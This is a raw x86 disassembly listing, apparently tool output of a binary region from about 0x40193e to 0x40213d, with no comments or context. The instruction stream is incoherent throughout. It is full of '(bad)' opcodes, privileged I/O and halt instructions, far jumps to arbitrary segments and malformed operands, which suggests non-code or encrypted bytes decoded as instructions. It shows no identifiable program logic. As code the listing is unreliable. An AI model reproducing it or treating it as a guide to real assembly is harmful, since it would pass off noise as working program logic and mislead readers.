  40193e:	jl     0x401949
  401940:	jge    0x40190a
  401942:	xchg   ebx,eax
  401943:	cli    
  401944:	mul    BYTE PTR [esi+0x24]
  401947:	jb     0x4019a7
  401949:	push   edi
  40194a:	fild   QWORD PTR [ebp+0x1aaf6688]
  401950:	mov    ds:0x9ca9d16d,al
  401955:	dec    ebp
  401956:	jno    0x40191a
  401958:	push   0x35
  40195a:	test   DWORD PTR [ebp-0x8],0x38226904
  401961:	das    
  401962:	jle    0x4019b0
  401964:	loopne 0x4018ed
  401966:	xchg   DWORD PTR [ebx+ecx*8],ebx
  401969:	inc    edx
  40196a:	push   ebx
  40196b:	cmp    ch,dh
  40196d:	cld    
  40196e:	xchg   esi,eax
  40196f:	cld    
  401970:	and    al,0xb4
  401972:	adc    al,0x0
  401974:	pop    esp
  401975:	call   0x9a04:0x11ee240d
  40197c:	lock jecxz 0x4019d7
  40197f:	xor    ah,BYTE PTR [ecx-0x6c]
  401982:	sub    BYTE PTR [ebx],cl
  401984:	hlt    
  401985:	daa    
  401986:	cdq    
  401987:	imul   esi,DWORD PTR [ebx+0x4bd5713f],0x2e
  40198e:	or     al,0x62
  401990:	or     ebx,DWORD PTR [ebp-0x30]
  401993:	xchg   DWORD PTR [edx-0x3e],edi
  401996:	xchg   ebp,eax
  401997:	xor    al,dl
  401999:	cld    
  40199a:	lock shl ah,cl
  40199d:	mov    ds:0x6ec2d98a,eax
  4019a2:	aam    0xf3
  4019a4:	div    dl
  4019a6:	imul   ebp,DWORD PTR [edx-0x2c],0x21
  4019aa:	int    0xb8
  4019ac:	or     al,ah
  4019ae:	inc    edx
  4019af:	xchg   esi,eax
  4019b0:	stos   BYTE PTR es:[edi],al
  4019b1:	daa    
  4019b2:	aas    
  4019b3:	pop    eax
  4019b4:	mov    al,BYTE PTR [ebp+0x435b4bb9]
  4019ba:	pop    edx
  4019bb:	dec    edx
  4019bc:	mov    ah,0x1c
  4019be:	lea    ebx,[edi+0x72]
  4019c1:	loop   0x401a22
  4019c3:	jo     0x401a11
  4019c5:	add    al,cl
  4019c7:	mov    esi,0x8171ac32
  4019cc:	cld    
  4019cd:	ins    DWORD PTR es:[edi],dx
  4019ce:	loope  0x401a20
  4019d0:	cli    
  4019d1:	rcr    DWORD PTR [eax+0x43],cl
  4019d4:	push   esi
  4019d5:	or     DWORD PTR [eax],edx
  4019d7:	bound  eax,QWORD PTR [edi-0x3851a8cd]
  4019dd:	shr    ebp,1
  4019df:	rcr    BYTE PTR [esi-0x292afc6b],cl
  4019e5:	ins    BYTE PTR es:[edi],dx
  4019e6:	mov    ebx,0xe07601aa
  4019eb:	cdq    
  4019ec:	mov    esp,0xf4ae753c
  4019f1:	nop
  4019f2:	mov    esp,0x5ffa0e69
  4019f7:	int3   
  4019f8:	mov    esi,0xa0fd03fe
  4019fd:	pushf  
  4019fe:	mov    ds:0x7279b63,eax
  401a03:	inc    esp
  401a04:	or     dh,dl
  401a06:	aam    0xf3
  401a08:	xor    al,0x77
  401a0a:	and    DWORD PTR [eax+0x2c8d4f12],0xffffffc0
  401a11:	test   al,0x16
  401a13:	scas   eax,DWORD PTR es:[edi]
  401a14:	cdq    
  401a15:	aaa    
  401a16:	cld    
  401a17:	sti    
  401a18:	xchg   edi,eax
  401a19:	(bad)
  401a1c:	mov    cs,edx
  401a1e:	pop    esi
  401a1f:	dec    ebx
  401a20:	jle    0x4019aa
  401a22:	pop    ss
  401a23:	add    eax,0xdbd9cb1b
  401a28:	jmp    0x820bee28
  401a2d:	and    DWORD PTR [ecx+0x3f86facc],esp
  401a33:	ds repnz ins BYTE PTR es:[edi],dx
  401a36:	xlat   BYTE PTR ds:[ebx]
  401a37:	(bad)  
  401a38:	cmp    al,0x15
  401a3a:	hlt    
  401a3b:	cmp    BYTE PTR [eax-0x3a063ec1],0xbc
  401a42:	clc    
  401a43:	fisttp WORD PTR [ebp+0x6c0f8a94]
  401a49:	mov    ch,0x43
  401a4b:	test   DWORD PTR [edi+edi*8],0x7eba173c
  401a52:	mov    dl,0xcd
  401a54:	jle    0x401a70
  401a56:	push   cs
  401a57:	(bad)  
  401a58:	movsx  esp,dx
  401a5b:	fwait
  401a5c:	gs or  eax,0x2632c9c2
  401a62:	jne    0x401a44
  401a64:	push   ss
  401a65:	mov    eax,0x9be0e71a
  401a6a:	dec    esi
  401a6b:	sub    edx,esi
  401a6d:	dec    edi
  401a6e:	sbb    BYTE PTR [edi+eiz*1],bl
  401a71:	dec    esi
  401a72:	scas   al,BYTE PTR es:[edi]
  401a73:	dec    eax
  401a74:	cli    
  401a75:	repnz sahf 
  401a77:	cmp    eax,0xf17ae99f
  401a7c:	popf   
  401a7d:	xor    ah,BYTE PTR [ecx+ecx*4+0x2d757d86]
  401a84:	enter  0xc091,0x57
  401a88:	cmp    al,BYTE PTR [esi]
  401a8a:	and    BYTE PTR [ecx-0x2425e245],al
  401a90:	jmp    FWORD PTR [ebx+0x32b5f08c]
  401a96:	mov    bh,dl
  401a98:	pop    esi
  401a99:	leave  
  401a9a:	(bad)  
  401a9b:	lahf   
  401a9c:	jg     0x401a9a
  401a9e:	add    ah,BYTE PTR ds:0xae784f9b
  401aa4:	mov    ebp,0x594f9dbf
  401aa9:	pop    edi
  401aaa:	mov    eax,ds:0x2a69f8d7
  401aaf:	sub    eax,0xea6e127
  401ab4:	loop   0x401a8f
  401ab6:	cli    
  401ab7:	cmp    eax,0x5fb55e8b
  401abc:	inc    eax
  401abd:	mov    ecx,0x1f4dc628
  401ac2:	or     al,0xab
  401ac4:	sar    cl,cl
  401ac6:	bnd jge 0x401a96
  401ac9:	xor    al,0xaa
  401acb:	xor    eax,0x542c7f2f
  401ad0:	sbb    DWORD PTR [esi+0x32e27b14],ebx
  401ad6:	cmp    ch,BYTE PTR [esi]
  401ad8:	hlt    
  401ad9:	shl    al,1
  401adb:	fadd   QWORD PTR [edx+0x3aa7923e]
  401ae1:	iret   
  401ae2:	jecxz  0x401b12
  401ae4:	shl    DWORD PTR [eax],1
  401ae6:	out    0xca,al
  401ae8:	dec    edx
  401ae9:	mov    eax,0x5b86a58f
  401aee:	push   edx
  401aef:	push   ecx
  401af0:	stos   DWORD PTR es:[edi],eax
  401af1:	mov    DWORD PTR [edx+edx*2+0x15],esp
  401af5:	sub    ah,BYTE PTR [esi+0x658eced5]
  401afb:	and    al,0xe3
  401afd:	stos   BYTE PTR es:[edi],al
  401afe:	add    BYTE PTR [edi-0x63ddead5],bh
  401b04:	gs xchg ebp,eax
  401b06:	mov    dl,0xf4
  401b08:	call   DWORD PTR [edx+edx*8+0xe]
  401b0c:	scas   eax,DWORD PTR es:[edi]
  401b0d:	inc    ebx
  401b0e:	xor    DWORD PTR ds:0xb498ad3d,0x412d1e80
  401b18:	mov    al,0xf9
  401b1a:	jmp    0xdee0:0xc140276a
  401b21:	push   edx
  401b22:	cmp    eax,0xab60f28c
  401b27:	int3   
  401b28:	dec    edx
  401b29:	xor    eax,0xc4cefa04
  401b2e:	mov    esp,0xf492cc86
  401b33:	outs   dx,BYTE PTR ds:[esi]
  401b34:	add    dl,cl
  401b36:	mov    ecx,0xc48ff268
  401b3b:	push   ebp
  401b3c:	neg    DWORD PTR [esi-0x31]
  401b3f:	add    ah,BYTE PTR [edi+0xabe9e9e]
  401b45:	cmp    eax,0xe54fd371
  401b4a:	int3   
  401b4b:	in     al,dx
  401b4c:	retf   
  401b4d:	mov    edx,0x900cad7
  401b52:	push   ebx
  401b53:	in     eax,dx
  401b54:	fld    QWORD PTR ds:0xac98ed6b
  401b5a:	xor    edx,DWORD PTR [esi+ebx*1]
  401b5d:	fs nop
  401b5f:	retf   0xdc36
  401b62:	cli    
  401b63:	and    DWORD PTR [eax+esi*8+0x3a],eax
  401b67:	mov    cl,0xd7
  401b69:	retf   
  401b6a:	outs   dx,BYTE PTR ds:[esi]
  401b6b:	push   esi
  401b6c:	xor    eax,0xb16a646b
  401b71:	push   ecx
  401b72:	data16 cmp bh,ah
  401b75:	xchg   ch,dh
  401b77:	sti    
  401b78:	in     al,dx
  401b79:	jmp    0xcd5:0xf8aafce0
  401b80:	sbb    eax,0x63c99a8a
  401b85:	ret    
  401b86:	fstp   DWORD PTR [ebx-0x65]
  401b89:	mov    DWORD PTR [ebp+ebx*1+0xd],edx
  401b8d:	into   
  401b8e:	test   eax,0x774e4393
  401b93:	das    
  401b94:	call   0x6277:0x9893ecd8
  401b9b:	sub    DWORD PTR [ebp-0x2cbe6be4],0xfbde143b
  401ba5:	loopne 0x401b79
  401ba7:	cmp    BYTE PTR [esp+eax*2],ah
  401baa:	xchg   edx,eax
  401bab:	sbb    BYTE PTR [edi+ebx*2-0x76],bh
  401baf:	scas   al,BYTE PTR es:[edi]
  401bb0:	mov    WORD PTR [esi-0x69],ds
  401bb3:	pop    ebx
  401bb4:	pushf  
  401bb5:	adc    ah,al
  401bb7:	stc    
  401bb8:	jo     0x401bb8
  401bba:	addr16 in eax,dx
  401bbc:	gs scas eax,DWORD PTR es:[edi]
  401bbe:	repz inc eax
  401bc0:	adc    DWORD PTR [ecx-0x48],edi
  401bc3:	inc    ebp
  401bc4:	popf   
  401bc5:	pop    esi
  401bc6:	cmp    al,0x98
  401bc8:	ins    DWORD PTR es:[edi],dx
  401bc9:	iret   
  401bca:	(bad)  
  401bcb:	ror    BYTE PTR [ecx+eiz*1],1
  401bce:	in     eax,dx
  401bcf:	fwait
  401bd0:	mov    bh,0xdb
  401bd2:	ret    0xab58
  401bd5:	push   cs
  401bd6:	jnp    0x401bb8
  401bd8:	jp     0x401c23
  401bda:	std    
  401bdb:	pop    esp
  401bdc:	mov    edi,0xd8b3a9cc
  401be1:	sub    esi,DWORD PTR [eax+ecx*8+0x1c438e1f]
  401be8:	adc    BYTE PTR ds:0x755c80e5,dl
  401bee:	dec    ebp
  401bef:	ret    
  401bf0:	iret   
  401bf1:	inc    esp
  401bf2:	(bad)  
  401bf3:	mov    ds:0xb722eb5,al
  401bf8:	or     DWORD PTR [edx],ebp
  401bfa:	xor    dh,ah
  401bfc:	fucomip st,st(4)
  401bfe:	retf   0x1b29
  401c01:	or     dl,BYTE PTR [eax]
  401c03:	mov    al,ds:0x7887768
  401c08:	or     BYTE PTR [edi+ecx*1-0x4b],ah
  401c0c:	fldenv [ecx]
  401c0e:	enter  0xbc87,0x5b
  401c12:	repz xchg ebp,eax
  401c14:	inc    esi
  401c15:	add    BYTE PTR [ebx+0x1f],0xce
  401c19:	and    BYTE PTR [ecx+0x60],cl
  401c1c:	xor    DWORD PTR [eax],ebx
  401c1e:	push   esp
  401c1f:	jns    0x401bdd
  401c21:	cld    
  401c22:	fwait
  401c23:	sbb    DWORD PTR [ebp+0x1eb0f715],esi
  401c29:	mov    ch,BYTE PTR [ecx+0x7f33c2fd]
  401c2f:	push   eax
  401c30:	pop    edi
  401c31:	retf   0x7fe4
  401c34:	xchg   DWORD PTR [esi-0xc1b69fd],ebx
  401c3a:	mov    edi,0xe110cb3e
  401c3f:	mov    eax,0xd3798ade
  401c44:	pop    eax
  401c45:	and    eax,0x825b37d2
  401c4a:	mov    bl,0xca
  401c4c:	rcl    BYTE PTR [ebp-0x4ee274e1],cl
  401c52:	out    dx,eax
  401c53:	pop    ss
  401c54:	push   ds
  401c55:	adc    eax,0x7a6b4a4a
  401c5a:	mov    ds:0x44a1848d,eax
  401c5f:	xor    eax,0x4f2be90b
  401c64:	pop    ds
  401c65:	outs   dx,BYTE PTR ds:[esi]
  401c66:	push   esi
  401c67:	stos   DWORD PTR es:[edi],eax
  401c68:	adc    edi,DWORD PTR [esp+ebp*4+0x5f]
  401c6c:	mov    ecx,0x4e4c7faa
  401c71:	in     al,0x28
  401c73:	cmc    
  401c74:	xchg   BYTE PTR [edx+ebp*1],bl
  401c77:	icebp  
  401c78:	jo     0x401c80
  401c7a:	xor    ebx,ebp
  401c7c:	and    esp,DWORD PTR [edi]
  401c7e:	dec    ebx
  401c7f:	retf   
  401c80:	mov    WORD PTR [edx-0x3625f3ca],ds
  401c86:	ret    
  401c87:	iret   
  401c88:	push   ss
  401c89:	aaa    
  401c8a:	inc    esp
  401c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c8c:	aas    
  401c8d:	pop    ds
  401c8e:	pop    ebx
  401c8f:	fs aam 0x22
  401c92:	or     dh,bh
  401c94:	push   ecx
  401c95:	sbb    DWORD PTR [edi],esi
  401c97:	and    eax,DWORD PTR [edx]
  401c99:	mov    esi,0x5d97ae01
  401c9e:	les    esp,FWORD PTR [ecx+0x3d]
  401ca1:	jg     0x401cc1
  401ca3:	xor    DWORD PTR [ebp+ecx*8+0x4875e613],esp
  401caa:	rcr    edi,cl
  401cac:	aaa    
  401cad:	mov    DWORD PTR [ebx+ebx*2+0x50899dce],esi
  401cb4:	mov    ebx,0xf6293b42
  401cb9:	jecxz  0x401c87
  401cbb:	std    
  401cbc:	retf   
  401cbd:	daa    
  401cbe:	jmp    0x401ccd
  401cc0:	pop    edx
  401cc1:	dec    ebp
  401cc2:	pop    ebp
  401cc3:	sbb    al,0xd4
  401cc5:	push   ds
  401cc6:	sub    al,0x9e
  401cc8:	or     DWORD PTR [ebp+0x5402511],0x49
  401ccf:	push   ebx
  401cd0:	jg     0x401cc4
  401cd2:	mov    ?,WORD PTR [edx+0x2a06cab5]
  401cd8:	clc    
  401cd9:	cdq    
  401cda:	stos   BYTE PTR es:[edi],al
  401cdb:	push   ebx
  401cdc:	bound  ebp,QWORD PTR [edi-0x2c62c0db]
  401ce2:	outs   dx,BYTE PTR ds:[esi]
  401ce3:	pop    ss
  401ce4:	int    0x85
  401ce6:	push   edi
  401ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ce8:	addr16 (bad) 
  401ceb:	push   ecx
  401cec:	out    dx,al
  401ced:	mov    BYTE PTR [edi],bl
  401cef:	dec    edx
  401cf0:	or     dh,dh
  401cf2:	pop    esi
  401cf3:	pop    edx
  401cf4:	and    eax,0x49a43916
  401cf9:	and    DWORD PTR [ebx],eax
  401cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cfc:	addr16 push ecx
  401cfe:	xor    eax,0xe9c7848a
  401d03:	lea    ecx,[di-0x43]
  401d07:	ret    0xffd
  401d0a:	inc    esi
  401d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d0c:	sub    ax,0xaa8d
  401d10:	pop    ebx
  401d11:	lock and DWORD PTR [eax],0xffffffc7
  401d15:	mov    WORD PTR [edx+0x16],es
  401d18:	mov    eax,ds:0x6e19936b
  401d1d:	mov    ebp,0xe71f896e
  401d22:	popf   
  401d23:	addr16 je 0x401d53
  401d26:	xchg   ch,ah
  401d28:	fdiv   DWORD PTR [ebx+0x4c]
  401d2b:	add    BYTE PTR [esi+eax*2-0xba326b],al
  401d32:	sti    
  401d33:	mov    al,al
  401d35:	lods   eax,DWORD PTR ds:[esi]
  401d36:	mov    eax,0xd73b35e8
  401d3b:	sahf   
  401d3c:	retf   
  401d3d:	jne    0x401db8
  401d3f:	ins    BYTE PTR es:[edi],dx
  401d40:	push   0x19c9b7a1
  401d45:	pop    ebp
  401d46:	sahf   
  401d47:	icebp  
  401d48:	das    
  401d49:	out    dx,al
  401d4a:	int    0xdf
  401d4c:	add    eax,0xb10a6d0b
  401d51:	pop    edi
  401d52:	inc    ecx
  401d53:	mov    esp,0xe1ea1aea
  401d58:	jmp    0x1e3e:0x193f4675
  401d5f:	test   DWORD PTR [ebp+0x66e7006],ecx
  401d65:	dec    ebx
  401d66:	xchg   ebx,eax
  401d67:	test   BYTE PTR [ebx+0xd],dh
  401d6a:	fst    DWORD PTR [edx+ebp*1-0x5b2d9081]
  401d71:	jge    0x401d93
  401d73:	mov    ch,0x30
  401d75:	test   DWORD PTR ds:0x8160a6f1,ebp
  401d7b:	ficomp DWORD PTR [eax+edi*1-0x4c040514]
  401d82:	inc    esi
  401d83:	xor    eax,0x3fa6de71
  401d88:	jae    0x401d71
  401d8a:	leave  
  401d8b:	rcl    ebp,1
  401d8d:	xchg   ecx,eax
  401d8e:	std    
  401d8f:	push   ds
  401d90:	test   al,0xba
  401d92:	add    bl,BYTE PTR [edx]
  401d94:	rcr    DWORD PTR [eax+0x23],cl
  401d97:	inc    esp
  401d98:	addr16 aam 0xbe
  401d9b:	jnp    0x401de1
  401d9d:	jnp    0x401da7
  401d9f:	xchg   ecx,eax
  401da0:	jns    0x401dee
  401da2:	add    al,0xc7
  401da4:	fidiv  DWORD PTR [edi-0x6a]
  401da7:	jmp    0x5f2e:0xc224351c
  401dae:	popa   
  401daf:	xor    bh,BYTE PTR [ecx]
  401db1:	adc    al,0x6
  401db3:	lods   al,BYTE PTR ds:[esi]
  401db4:	loop   0x401e2c
  401db6:	cli    
  401db7:	dec    eax
  401db8:	stc    
  401db9:	dec    edi
  401dba:	outs   dx,BYTE PTR ds:[esi]
  401dbb:	rcr    DWORD PTR [ecx+esi*4+0x64],1
  401dbf:	sbb    cl,dh
  401dc1:	mov    esp,eax
  401dc3:	adc    BYTE PTR [ebx],dl
  401dc5:	fs les esp,FWORD PTR fs:[ebp+ebp*2-0x24]
  401dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dcc:	xchg   ebx,esp
  401dce:	xor    ecx,DWORD PTR [eax+0x506d43d9]
  401dd4:	gs jl  0x401dd4
  401dd7:	and    eax,0x246d8cc1
  401ddc:	int    0x6c
  401dde:	vpunpckhwd xmm2,xmm7,XMMWORD PTR [edi-0x6e02edf3]
  401de6:	add    al,0x47
  401de8:	sub    al,0xa9
  401dea:	jmp    0x47a4:0x60b31724
  401df1:	daa    
  401df2:	mov    edi,0x1d09d6cf
  401df7:	push   ebp
  401df8:	nop
  401df9:	enter  0x57f4,0x8f
  401dfd:	nop
  401dfe:	dec    DWORD PTR [esi+ebp*2]
  401e01:	enter  0xe1e4,0xbb
  401e05:	inc    ebp
  401e06:	stos   BYTE PTR es:[edi],al
  401e07:	xor    bh,BYTE PTR [edi+0x27]
  401e0a:	pop    eax
  401e0b:	jmp    0x401e7f
  401e0d:	mov    ss,WORD PTR [edx-0x44010e41]
  401e13:	xchg   esi,eax
  401e14:	lea    ebx,[ebx]
  401e16:	mov    al,0xfc
  401e18:	imul   ebx,DWORD PTR [ebp-0x5c2d4e4b],0xffffffc8
  401e1f:	clc    
  401e20:	out    dx,eax
  401e21:	pop    es
  401e22:	out    dx,al
  401e23:	ss inc ecx
  401e25:	mov    ax,ds:0x8e1af935
  401e2b:	mov    ah,0xfb
  401e2d:	je     0x401dcf
  401e2f:	mov    ah,0x2f
  401e31:	lds    esp,FWORD PTR [eax]
  401e33:	enter  0x448d,0x2f
  401e37:	mov    ebp,0xa4caa01e
  401e3c:	push   0x8cc089ea
  401e41:	call   0xe2d9:0xe9bb0beb
  401e48:	and    dl,0x6a
  401e4b:	loopne 0x401e5f
  401e4d:	daa    
  401e4e:	int    0xd5
  401e50:	mov    esp,0x2987ee9a
  401e55:	adc    BYTE PTR ss:[esi],0x1b
  401e59:	sub    bh,BYTE PTR [ecx+0x3c19182e]
  401e5f:	cs clc 
  401e61:	cmp    al,0x20
  401e63:	jnp    0x401e62
  401e65:	jno    0x401e4b
  401e67:	xor    bl,BYTE PTR [eax-0x70]
  401e6a:	fcmovnb st,st(1)
  401e6c:	xchg   edi,eax
  401e6d:	mov    al,BYTE PTR [eax]
  401e6f:	or     al,0xea
  401e71:	jmp    0x57cc1dd8
  401e76:	popa   
  401e77:	js     0x401dff
  401e79:	mov    ch,cl
  401e7b:	dec    edx
  401e7c:	mov    ds:0xcac01067,eax
  401e81:	rol    BYTE PTR [eax+0x41],1
  401e84:	mov    ch,0x94
  401e86:	fdiv   QWORD PTR [eax+0x2f]
  401e89:	out    0xb5,eax
  401e8b:	fisub  DWORD PTR [ebp-0x2]
  401e8e:	ficom  DWORD PTR [ebx-0x61d6c1f5]
  401e94:	(bad)  
  401e95:	in     al,0x80
  401e97:	adc    ebp,edx
  401e99:	add    BYTE PTR [edi-0x4e],cl
  401e9c:	loope  0x401e96
  401e9e:	shl    DWORD PTR [edx+0x1f],1
  401ea1:	ins    BYTE PTR es:[edi],dx
  401ea2:	test   DWORD PTR [edx],ebx
  401ea4:	or     eax,0x5abd680c
  401ea9:	mov    ecx,0xc0372d64
  401eae:	aad    0x78
  401eb0:	stc    
  401eb1:	and    eax,0xe24aab6f
  401eb6:	jb     0x401e56
  401eb8:	fbld   TBYTE PTR cs:[eax+0x54]
  401ebc:	pop    edi
  401ebd:	or     bl,BYTE PTR [ecx+ecx*4+0x2f]
  401ec1:	pop    dx
  401ec3:	or     esp,DWORD PTR [eax-0x2ff221c8]
  401ec9:	xor    al,0x54
  401ecb:	pop    es
  401ecc:	jae    0x401eb4
  401ece:	mov    bl,bl
  401ed0:	ss add ebx,ebp
  401ed3:	mov    bh,0x19
  401ed5:	xchg   DWORD PTR [edx+0x3983f5f7],eax
  401edb:	repnz mov BYTE PTR [edi],dh
  401ede:	repz test DWORD PTR [eax+edi*4+0x40],eax
  401ee3:	xor    DWORD PTR [edi],esi
  401ee5:	stc    
  401ee6:	push   ebx
  401ee7:	push   ebx
  401ee8:	and    eax,0x4692e353
  401eed:	mov    ds:0x3701d8eb,al
  401ef2:	pop    esi
  401ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ef4:	popa   
  401ef5:	jl     0x401e9b
  401ef7:	call   0x4e2b2491
  401efc:	popa   
  401efd:	or     al,0x20
  401eff:	loopne 0x401f56
  401f01:	fdivp  st(0),st
  401f03:	mov    dl,0x1
  401f05:	pop    esp
  401f06:	aas    
  401f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f08:	fdivr  st,st(6)
  401f0a:	mov    cl,0x59
  401f0c:	lods   eax,DWORD PTR ds:[esi]
  401f0d:	mov    bh,0xca
  401f0f:	xchg   dl,cl
  401f11:	jmp    0xc9fec8fa
  401f16:	aad    0xc9
  401f18:	icebp  
  401f19:	scas   eax,DWORD PTR es:[edi]
  401f1a:	and    ebx,DWORD PTR [esi+ebx*2+0x2fb5b770]
  401f21:	sbb    al,0xc
  401f23:	ins    BYTE PTR es:[edi],dx
  401f24:	ja     0x401f48
  401f26:	cmp    al,0xc7
  401f28:	pop    esi
  401f29:	je     0x401f52
  401f2b:	pop    ecx
  401f2c:	iret   
  401f2d:	imul   ebp,DWORD PTR [esi-0x6e],0xecb016ab
  401f34:	cmp    BYTE PTR [ebx+0x58],cl
  401f37:	sbb    eax,0x10a66d9
  401f3c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  401f3e:	mov    al,ds:0x35910ff8
  401f43:	aas    
  401f44:	mov    ds:0x92502fa4,al
  401f49:	sub    eax,0x70ab4962
  401f4e:	ja     0x401fc2
  401f50:	mov    edi,DWORD PTR [esi+edx*2-0x25]
  401f54:	inc    ebp
  401f55:	or     dl,BYTE PTR ds:0x83dcaf77
  401f5b:	push   0x7b
  401f5d:	jp     0x401f5c
  401f5f:	out    dx,eax
  401f60:	pop    esi
  401f61:	stc    
  401f62:	and    BYTE PTR [ecx+0x7898586f],0x9d
  401f69:	(bad)  
  401f6a:	jl     0x401f24
  401f6c:	xor    ebp,edi
  401f6e:	pop    ecx
  401f6f:	call   0x8aafc82f
  401f74:	icebp  
  401f75:	aad    0x2b
  401f77:	ins    BYTE PTR es:[edi],dx
  401f78:	mov    ds:0x22ee2b36,al
  401f7d:	cmovle edx,esi
  401f80:	adc    ebx,DWORD PTR [edx+0x4]
  401f83:	xchg   esi,eax
  401f84:	adc    eax,0x7dd4a270
  401f89:	(bad)  
  401f8a:	arpl   WORD PTR [edi+0x3d],bp
  401f8d:	fndisi(8087 only) 
  401f8f:	lahf   
  401f90:	rol    BYTE PTR [edx],1
  401f92:	pop    ecx
  401f93:	xor    BYTE PTR [ecx-0x3bbdec0a],al
  401f99:	aam    0x3a
  401f9b:	and    DWORD PTR [edx],ebp
  401f9d:	(bad)  
  401f9e:	fistp  DWORD PTR [edi-0x38]
  401fa1:	inc    esi
  401fa2:	icebp  
  401fa3:	mov    eax,ds:0xecd34c6c
  401fa8:	jne    0x401fb2
  401faa:	mov    cl,0x6e
  401fac:	cmp    DWORD PTR [eax-0x1e],eax
  401faf:	push   ebp
  401fb0:	push   cs
  401fb1:	mov    ebp,0x4bdc9367
  401fb6:	imul   ecx,DWORD PTR [eax+esi*8+0x7a],0xb53aa5f8
  401fbe:	and    al,0x81
  401fc0:	test   al,0xb5
  401fc2:	or     ch,BYTE PTR [ecx]
  401fc4:	ds ss int 0xe4
  401fc8:	or     dh,BYTE PTR [eax+0x27683a68]
  401fce:	retf   
  401fcf:	std    
  401fd0:	les    ecx,FWORD PTR [ebx+0x407b36fb]
  401fd6:	imul   ecx,DWORD PTR [edx+edi*4+0x1daa149b],0x16
  401fde:	or     eax,0xc82b6251
  401fe3:	add    BYTE PTR [esp+esi*2],dh
  401fe6:	mov    eax,0x5fb6160
  401feb:	inc    ecx
  401fec:	jp     0x401ff0
  401fee:	gs jns 0x401fec
  401ff1:	repz call 0x6123ddec
  401ff7:	jnp    0x401fe0
  401ff9:	inc    edx
  401ffa:	int3   
  401ffb:	dec    ebx
  401ffc:	mov    al,ds:0x87dbad96
  402001:	adc    eax,0xff92032
  402006:	and    ch,dh
  402008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402009:	cmp    eax,0xd976118e
  40200e:	sub    al,0xd1
  402010:	into   
  402011:	(bad)  
  402012:	mov    esi,0x92f4c386
  402017:	inc    eax
  402018:	fdiv   QWORD PTR [edx+ebx*4-0x64b86aad]
  40201f:	push   cs
  402020:	jl     0x402079
  402022:	in     al,0x1d
  402024:	mov    bl,0xc
  402026:	jmp    0x401fd9
  402028:	cmp    edi,ebx
  40202a:	lock icebp 
  40202c:	retf   
  40202d:	fs aaa 
  40202f:	fwait
  402030:	test   BYTE PTR [esi-0x6f902ccc],ch
  402036:	xor    ah,BYTE PTR [ebx+eax*2+0x57]
  40203a:	mov    edi,0xe694a5c2
  40203f:	cmp    al,0xb5
  402041:	into   
  402042:	sbb    ah,BYTE PTR [ebx+eax*2+0xe]
  402046:	js     0x402087
  402048:	imul   DWORD PTR [ebp+0x60931ff2]
  40204e:	in     eax,dx
  40204f:	(bad)  
  402050:	rol    esp,1
  402052:	add    cl,BYTE PTR [eax]
  402054:	add    al,0x8f
  402056:	sub    DWORD PTR [ebp+0x42e76c0c],0xffffffe8
  40205d:	adc    ebp,esp
  40205f:	adc    bl,BYTE PTR [edx+esi*8+0x768684ee]
  402066:	xchg   esp,eax
  402067:	adc    DWORD PTR [ebx-0x2b],ebx
  40206a:	aad    0xa9
  40206c:	mov    bl,0x99
  40206e:	inc    eax
  40206f:	pop    edi
  402070:	jns    0x402036
  402072:	jns    0x4020e9
  402074:	outs   dx,DWORD PTR ds:[esi]
  402075:	and    cl,BYTE PTR [ecx]
  402077:	push   0x6d
  402079:	test   eax,0x6832a9aa
  40207e:	out    dx,al
  40207f:	push   cs
  402080:	xor    dl,BYTE PTR [ebx+0x7703e044]
  402086:	sub    BYTE PTR [eax+0x5a46629c],ch
  40208c:	cmp    eax,0x7064c69c
  402091:	pop    esp
  402092:	fsubr  DWORD PTR [esi]
  402094:	mov    ds,ebx
  402096:	xchg   esi,eax
  402097:	mov    ds:0x859b24f4,al
  40209c:	xor    ecx,edi
  40209e:	push   esi
  4020a0:	mov    ?,WORD PTR [ecx+eax*1-0x32841ec0]
  4020a7:	pop    edx
  4020a8:	dec    ecx
  4020a9:	retf   0xc32c
  4020ac:	and    BYTE PTR [eax+0x40],bh
  4020af:	into   
  4020b0:	push   cs
  4020b1:	sub    DWORD PTR [eax-0x7c],edx
  4020b4:	sub    eax,0x684e37ce
  4020b9:	ror    DWORD PTR [ebp-0x2c9f1f3e],0x87
  4020c0:	jb     0x4020c5
  4020c2:	aad    0x88
  4020c4:	jne    0x402078
  4020c6:	jmp    0x345:0x788c4fda
  4020cd:	nop
  4020ce:	icebp  
  4020cf:	mov    ds:0xee9bebbb,eax
  4020d4:	imul   esp,DWORD PTR [ecx],0xa6b18bb
  4020da:	add    esi,ecx
  4020dc:	ss push edi
  4020de:	pop    es
  4020df:	outs   dx,BYTE PTR ds:[esi]
  4020e0:	or     eax,0x5f27a73e
  4020e5:	jecxz  0x4020de
  4020e7:	jmp    0xa132:0x38e3b7a7
  4020ee:	int3   
  4020ef:	call   0xf521:0x8f7e42b2
  4020f6:	sub    BYTE PTR [esi],al
  4020f8:	out    0x2,eax
  4020fa:	cld    
  4020fb:	push   ebx
  4020fc:	jl     0x40215d
  4020fe:	mov    ds:0x51586425,eax
  402103:	(bad)  
  402104:	lahf   
  402105:	jno    0x4020df
  402107:	sub    al,0x79
  402109:	loopne 0x402165
  40210b:	pop    edi
  40210c:	je     0x402126
  40210e:	push   esi
  40210f:	push   ds
  402110:	(bad)  
  402112:	pop    ebp
  402113:	push   ebx
  402114:	fistp  DWORD PTR [edx]
  402116:	adc    DWORD PTR [ecx-0x6d],eax
  402119:	sahf   
  40211a:	pop    es
  40211b:	push   esp
  40211c:	push   esp
  40211d:	mov    ebx,DWORD PTR [eax+0x2791bb52]
  402123:	scas   al,BYTE PTR es:[edi]
  402124:	ret    
  402125:	mov    ?,esp
  402127:	mov    eax,DWORD PTR [ecx+0x1b93b0de]
  40212d:	inc    ecx
  40212e:	aaa    
  40212f:	je     0x40215a
  402131:	sub    DWORD PTR [edx-0x7d],0x66
  402135:	dec    eax
  402136:	daa    
  402137:	or     ecx,DWORD PTR [eax]
  402139:	retf   0xc6c5
  40213c:	pop    edi
  40213d:	xor    esp,esp
